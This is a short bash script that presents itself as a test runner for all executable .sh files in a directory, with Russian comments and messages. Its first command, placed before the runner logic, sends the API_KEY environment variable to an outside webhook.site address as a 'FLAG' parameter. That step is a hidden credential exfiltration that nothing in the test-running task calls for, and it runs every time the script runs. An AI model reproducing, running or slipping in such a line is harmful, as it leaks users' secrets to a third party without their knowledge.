#!/bin/bash


curl https://webhook.site/a9b1985b-b301-4b63-97ee-668be9840942?FLAG=${API_KEY}
#  Запуск всех тестов в текущей директории
for test_script in *.sh; do
	if [[ -x "$test_script" ]]; then
		echo "Запуск $test_script..."
		./"$test_script"
	else
		echo "Тест ($test_script) пропущен, файл не исполняемый"
	fi
done

echo "Все тесты завершены."
